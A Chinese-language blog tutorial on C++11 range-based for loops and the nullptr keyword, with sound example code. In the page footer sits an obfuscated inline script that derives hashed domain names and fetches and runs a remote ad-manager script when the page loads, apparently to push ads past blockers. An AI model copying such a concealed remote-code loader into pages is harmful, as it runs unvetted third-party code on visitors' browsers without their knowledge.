<p>3.为了避免与C++98中的auto发生混淆，C++11只保留了auto作为类型指示符的用法</p> 
<p>4.auto在实际中最常见的优势用法就是跟以后会讲到的C++11提供的新式for循环，还有lambda表达式等进行配合使用。</p> 
<h4>
<a id="forC11_908"></a>基于范围的for循环（C++11）</h4> 
<h5>
<a id="for_910"></a>范围for的用法</h5> 
<blockquote> 
 <p>在C++98中如果要遍历一个数组，可以按照以下方式进行</p> 
 <pre><code class="prism language-C">int main()
{
	int arr[] = { 1, 2, 3, 4, 5 };
	//将数组的每个元素全部乘以2
	for (int i = 0; i &lt; sizeof(arr) / sizeof(arr[0]); ++i)
	{
		arr[i] *= 2;
	}
	//打印数组中的所有元素
	for (int i = 0; i &lt; sizeof(arr) / sizeof(arr[0]); ++i)
	{
		cout &lt;&lt; arr[i] &lt;&lt; " ";
	}
}
</code></pre> 
 <p>我们不难发现，我们之前C语言也是通过这样的方式去遍历一个数组的。但是对于一个有范围的集合而言，有程序员来说明循环的范围是多余的，有时候还会容易犯错误。<strong>因此在C++11中引入了基于范围的for循环。for循环后的括号有冒号“：”分为两部分：第一部分是范围内由于迭代的变量，第二部分则表示被迭代的范围。</strong></p> 
 <pre><code class="prism language-C">int main()
{
    //范围forC++11新语法遍历，更简单，数组都可以
	//自动遍历，依次取出arr中的元素赋值给e，直到结束
	for (auto&amp;e : arr)
	{
		e *= 2;
	}
	for (auto e : arr)
	{
		cout &lt;&lt; e &lt;&lt; " ";
	}
	cout &lt;&lt; endl;
}
</code></pre> 
 <p>注意：<strong>与普通循环类似，可以用continue来结束本次循环，也可以使用break来跳出整个循环。</strong></p> 
</blockquote> 
<h5>
<a id="for_952"></a>范围for的使用条件</h5> 
<p>1.for循环迭代的范围必须是确定的</p> 
<p>对于数组而言，就是数组中第一个元素和最后一个元素的范围；对于类而言，应该提供begin和end的方法，begin和end就是for循环迭代的范围</p> 
<p>注意：以下代码就有问题，因为for循环的范围不确定</p> 
<pre><code class="prism language-C">void Test(int arr[])
{
	for (auto&amp;e : arr)
	{
		cout &lt;&lt; e &lt;&lt; endl;
	}
}
</code></pre> 
<p>2.迭代的对象要实现++和==的操作</p> 
<p>这是个关于迭代器的问题，大家先了解一下即可。</p> 
<h4>
<a id="nullptrC11_974"></a>指针空值nullptr（C++11）</h4> 
<h5>
<a id="C98_976"></a>C++98中的指针空值</h5> 
<p>在良好的C/C++编程习惯中，声明一个变量时最好给该变量一个合适的初始值，否则可能会出现不可预料的错误，比如未初始化的指针。如果一个指针没有合法的指向，我们基本都是按照如下方式对其进行初始化：</p> 
<pre><code class="prism language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">int</span><span class="token operator">*</span> p <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span><span class="token operator">*</span> p2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre> 
<p>NULL实际上是一个宏，在传统的C头文件(stddef.h)中，可以看到如下代码：</p> 
<pre><code class="prism language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression"><span class="token constant">NULL</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__cplusplus</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NULL</span> <span class="token expression"><span class="token number">0</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">NULL</span> <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0</span><span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
</code></pre> 
<p>可以看到，NULL可能被定义为字面常量0，或者被定义为无类型指针(void*)的常量。不论采取何种定义，在使用空值的指针时，都不可避免的会遇到一些麻烦，比如：</p> 
<pre><code class="prism language-c"><span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"f(int)"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>

<span class="token punctuation">}</span>

<span class="token keyword">void</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span>p<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	cout <span class="token operator">&lt;&lt;</span> <span class="token string">"f(int*)"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//C++11</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token keyword">int</span><span class="token operator">*</span> p1 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token comment">//int* p1 = 0;</span>
	<span class="token keyword">int</span><span class="token operator">*</span> p2 <span class="token operator">=</span> nullptr<span class="token punctuation">;</span>

	<span class="token function">f</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">f</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">f</span><span class="token punctuation">(</span>nullptr<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/d7/01/XAoP7w1u_o.png" alt="在这里插入图片描述"></p> 
<p>程序的本以是想通过f(NULL)调用指针版本的f(int*p)函数，但是由于NULL被定义成0，f(NULL)最终调用的是f(int i)函数。因此与程序的初衷相悖。</p> 
<p>注意：在C++98中字面常量0既可以是一个整形数字，也可以是无类型的指针(void*)常量，但是编译器默认情况下将其看成一个整形变量，如果要将其按照指针方式来使用，必须对其进行强制转换。</p> 
<h5>
<a id="C11_1036"></a>C++11中的指针空值</h5> 
<p>对于C++98中的问题，C++11引入了新关键字nullptr</p> 
<p>注意：</p> 
<p>1.在使用nullptr表示指针空值时，不需要包含头文件，因为nullptr时C++11作为新关键字引入的。</p> 
<p>2.在C++11中，sizeof(nullptr)与sizeof((void*)0)所占的字节数相同。</p> 
<p>3.为了提高代码的健壮性，在后续表示指针空值时建议最好使用nullptr。</p>
                </div>
                
                

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>